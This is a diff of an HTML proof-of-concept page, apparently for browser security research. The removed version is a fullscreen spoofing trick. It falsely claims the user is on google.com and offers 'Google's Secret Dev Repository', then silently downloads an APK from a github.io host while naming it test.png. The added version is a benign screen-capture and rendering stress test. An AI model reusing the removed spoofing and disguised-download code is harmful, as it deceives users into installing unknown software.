@@ -1,97 +1,152 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Fullscreen + Delayed Download</title>
-  <style>
-    body {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-      font-family: sans-serif;
-      background: black;
-      color: white;
-    }
-    button {
-      font-size: 20px;
-      padding: 12px 24px;
-      cursor: pointer;
-    }
-  </style>
+<meta charset="UTF-8">
+<title>Chromium Rendering + Screen Capture Stress PoC</title>
+
+<style>
+body{
+  margin:0;
+  overflow:hidden;
+  background:black;
+  color:white;
+  font-family:sans-serif;
+}
+
+.box{
+  width:120px;
+  height:120px;
+  background:red;
+  position:absolute;
+  top:50%;
+  left:50%;
+  transform:translate(-50%,-50%);
+}
+
+canvas{
+  position:absolute;
+  top:0;
+  left:0;
+}
+</style>
 </head>
+
 <body>
-  <button id="startBtn">Google New App Download Button</button>
 
-  <script>
-    const btn = document.getElementById("startBtn");
+<h2>Chromium Rendering + Screen Capture Stress PoC</h2>
+<button onclick="startTest()">Start Test</button>
 
-    btn.addEventListener("click", async () => {
-      // Step 1: Request fullscreen
-      if (document.documentElement.requestFullscreen) {
-        await document.documentElement.requestFullscreen();
-      } else if (document.documentElement.webkitRequestFullscreen) {
-        await document.documentElement.webkitRequestFullscreen();
-      }
+<div class="box"></div>
+<canvas id="c"></canvas>
 
-      // Step 2: Show initial message
-      document.body.innerHTML = `
-        <div style="text-align:center; font-size:22px;">
-          Please wait a few seconds! We will redirect you to Google's Secret Dev Repository.
-        </div>
-      `;
+<script>
 
-      // Step 3: Wait 3 seconds, then replace with the invisible link setup
-      setTimeout(() => {
-        document.body.innerHTML = `
-          <a href="https://google.com" id="fullPageLink"></a>
-          <div id="downloadStatus" style="text-align:center; font-size:22px;">
-            You on google.com now! check the left/right corner origin indicator
-          </div>
+let running=true;
 
-          <style>
-            html, body {
-              height: 100%;
-              margin: 0;
-              background: black;
-              overflow: hidden;
-            }
-            #fullPageLink {
-              position: fixed;
-              top: 0;
-              left: 0;
-              width: 100%;
-              height: 100%;
-              background: transparent;
-              z-index: 1;
-            }
-            #downloadStatus {
-              position: fixed;
-              top: 50%;
-              left: 50%;
-              transform: translate(-50%, -50%);
-              z-index: 2;
-              color: white;
-            }
-          </style>
-        `;
+async function startTest(){
 
-        // Step 4: Wait another 3 seconds, then trigger the download
-        setTimeout(() => {
-          const a = document.createElement("a");
-          a.href = "https://frozzipies.github.io/googlebeta.apk"; // your hosted image
-          a.download = "test.png";
-          document.body.appendChild(a);
-          a.click();
-          a.remove();
+console.log("=== START TEST ===");
 
-          // Update text after download starts
-          document.getElementById("downloadStatus").textContent = "Download started!";
-        }, 7000);
-      }, 5000);
-    });
-  </script>
+try{
+
+const stream = await navigator.mediaDevices.getDisplayMedia({
+video:true,
+preferCurrentTab:true,
+audio:false
+});
+
+console.log("Screen capture stream:",stream);
+
+const video=document.createElement("video");
+video.srcObject=stream;
+video.autoplay=true;
+video.muted=true;
+video.style.position="absolute";
+video.style.bottom="10px";
+video.style.right="10px";
+video.style.width="200px";
+
+document.body.appendChild(video);
+
+}catch(e){
+console.error("getDisplayMedia error:",e);
+}
+
+triggerRendering();
+stressDOM();
+canvasStress();
+
+}
+
+function triggerRendering(){
+
+const box=document.querySelector(".box");
+let r=0;
+
+function frame(){
+r+=2;
+box.style.transform=`translate(-50%,-50%) rotate(${r}deg) scale(${1+Math.sin(r/20)*0.3})`;
+requestAnimationFrame(frame);
+}
+
+frame();
+
+}
+
+function stressDOM(){
+
+const container=document.createElement("div");
+document.body.appendChild(container);
+
+for(let i=0;i<1500;i++){
+
+const el=document.createElement("div");
+
+el.style.position="absolute";
+el.style.left=Math.random()*window.innerWidth+"px";
+el.style.top=Math.random()*window.innerHeight+"px";
+el.style.width=(20+Math.random()*50)+"px";
+el.style.height=(20+Math.random()*50)+"px";
+el.style.background=`hsl(${Math.random()*360},80%,50%)`;
+
+container.appendChild(el);
+
+}
+
+console.log("DOM stress elements created");
+
+}
+
+function canvasStress(){
+
+const canvas=document.getElementById("c");
+canvas.width=window.innerWidth;
+canvas.height=window.innerHeight;
+
+const ctx=canvas.getContext("2d");
+
+function draw(){
+
+for(let i=0;i<200;i++){
+
+ctx.fillStyle=`hsl(${Math.random()*360},80%,50%)`;
+ctx.fillRect(
+Math.random()*canvas.width,
+Math.random()*canvas.height,
+20+Math.random()*80,
+20+Math.random()*80
+);
+
+}
+
+requestAnimationFrame(draw);
+
+}
+
+draw();
+
+}
+
+</script>
 </body>
 </html>
